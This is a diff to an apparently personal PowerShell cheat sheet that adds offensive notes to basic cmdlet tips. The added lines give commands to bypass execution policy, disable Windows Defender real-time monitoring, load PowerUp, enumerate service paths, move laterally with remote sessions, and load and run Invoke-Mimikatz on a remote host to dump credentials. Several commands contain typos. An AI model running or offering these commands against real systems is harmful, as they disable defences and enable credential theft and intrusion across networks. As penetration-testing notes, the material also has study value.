@@ -23,7 +23,7 @@
 `Get-Content <file>  `
   
 ###### powershell: CMDlet help  
-`Get-Help <CMDlet> -examples  `
+`Get-Help <CMDlet> -Examples -Parameter Name`
   
 ###### powershell: display ps version  
 `$PSVersionTable`
@@ -61,4 +61,43 @@
 `Invoke-Function`
 
 ###### Bypass execution policy
+`Get-ExecutionPolicy`
 `powershell.exe -ep bypass`
+`powershell.exe -executionppolicy bypass .\script.ps1`
+
+###### GetAliase
+`Get-Alias -Name dir`
+`Get-Alias -Definition Get-Childitem`
+
+###### Get Command
+`Get-Command -CommandType cmdlet`
+`Get-Command -Name *process*`
+
+###### Disable windows defender by admin
+`Set-MpPreference -DisableRealtimeMonitoring $true`
+
+###### Invoke script
+`. .\Invoke-Encode.ps1`
+`Import-Module .\PowerUp.ps1`
+`Get-Module -ListAvailable`
+
+###### Enum services path
+`Get-WmiObject -Class win32_service |select pathname`
+
+# Leteral moving
+`New-PSSession -ComputerName op-terminalser`
+`$sess = New-PSSession -ComputerName op-terminalser`
+`Enter-PSSession -Session $sess`
+`hostname`
+
+`Invoke-Command -ScriptBlock{whoami,hostaname} -ComputerName ops-terminalser` #invoke command on other computer
+`Invoke-Command -ScriptBlock{$who = whoami} -ComputerName ops-terminalser` #invoke command on other computer
+`Invoke-Command -FilePath c:\temp\invoke-encode.ps1 -ComputerName ops-terminalser`
+`powershell -ep bypass`
+`. .\C:\Temp\Invoke-Mimikatz.ps1`
+`Invoke-Command -ScriptBlock{Invoke-Mimikatz} -ComputerName ops-terminalser` #invoke command on other computer
+`Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -ComputerName ops-terminalser` #invoke command on other computer
+
+`$sess = New-PSSession -ComputerName Server1`
+`Invoke-Command -Session $sess -ScriptBlock {$Proc = Get-Process}`
+`Invoke-Command -Session $sess -ScriptBlock {$Proc.Name}`
